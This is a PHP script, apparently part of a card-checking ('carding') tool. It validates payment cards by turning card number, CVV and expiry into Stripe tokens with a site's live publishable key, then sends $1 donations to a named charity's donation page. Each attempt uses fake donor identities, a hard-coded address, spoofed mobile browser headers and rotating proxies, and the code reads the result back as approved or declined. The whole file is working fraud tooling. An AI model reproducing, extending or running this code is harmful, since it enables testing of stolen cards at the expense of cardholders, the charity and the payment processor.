<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) $retry++;

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$fake = $this->tools->GetUser();

$cookie = uniqid();

$data = 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F96a3e870c%3B+stripe-js-v3%2F96a3e870c&time_on_page='.rand(50000, 100000).'&key=pk_live_scMYsW1jpj1G0PAk0JGP9JBg';

$r1 = $this->curlx->Post('https://api.stripe.com/v1/tokens', $data, null, null, $server['proxy']);

if (!$r1->success) goto start;

$json_r1 = json_decode($r1->body);

if (isset($json_r1->error)) {
	$status = $this->response->ErrorHandler($json_r1->error);

	goto end;
}

if (!isset($json_r1->id)) goto start;

$tok = $json_r1->id;

$r2 = $this->curlx->Get('https://wonderhere.causemachine.com/donate', null, $cookie, $server['proxy']);

if (!$r2->success) goto start;

$data = [
	'ProfileOrganizationID' => '',
	'Amount' => '1',
	'Frequency' => 'OneTime',
	'FirstName' => $fake->first,
	'LastName' => $fake->last,
	'Email' => $fake->email,
	'Phone' => '',
	'CreditCard.ShowRequiredFieldIndicators' => 'True',
	'BillingAddress.Address.Country' => 'US',
	'BillingAddress.Address.AddressLine1' => '12 main street',
	'BillingAddress.Address.AddressLine2' => '',
	'BillingAddress.Address.City' => 'Brewster',
	'BillingAddress.Address.State' => 'NY',
	'BillingAddress.StateDD' => 'NY',
	'BillingAddress.Address.Zip' => '10509',
	'BillingAddress.Address.Id' => '0',
	'BillingAddress.ShowDefaultBillAddress' => 'True',
	'BillingAddress.ShowDefaultShipAddress' => 'False',
	'BillingAddress.ShowDefaultHomeAddress' => 'False',
	'BillingAddress.ShowAttn' => 'False',
	'BillingAddress.ShowCompany' => 'False',
	'BillingAddress.ShowNickname' => 'False',
	'BillingAddress.ApplyStripeAttributes' => 'False',
	'BillingAddress.Required' => 'True',
	'BillingAddress.AddressFunctionId' => '',
	'BillingAddress.DefaultBillAddress' => 'false',
	'CreditCard.StripeToken' => $tok,
	'CreditCard.CCLast4' => $last4
];

$headers = [
	'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	'Accept-Language: en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
	'Cache-Control: max-age=0',
	'Connection: keep-alive',
	'Origin: https://wonderhere.causemachine.com',
	'Referer: https://wonderhere.causemachine.com/donate',
	'Sec-Fetch-Dest: document',
	'Sec-Fetch-Mode: navigate',
	'Sec-Fetch-Site: same-origin',
	'Sec-Fetch-User: ?1',
	'Upgrade-Insecure-Requests: 1',
	'User-Agent: Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.104 Mobile Safari/537.36',
	'sec-ch-ua: "Chromium";v="103", ".Not/A)Brand";v="99"',
	'sec-ch-ua-mobile: ?1',
	'sec-ch-ua-platform: "Android"'
];

$r3 = $this->curlx->Post('https://wonderhere.causemachine.com/donate', http_build_query($data), $headers, $cookie); // , $server['proxy']);

if (!$r3->success || empty($r3->body)) goto start;

$err = trim(strip_tags($this->getstr($r3->body, '<div class="validation-summary-errors" data-valmsg-summary="true">', '</div>')));

if (empty($err)) file_put_contents('stm_r3_err.txt', $r3->body . PHP_EOL, FILE_APPEND);

$status = $this->response->Stripe($r3->body, $err);

end: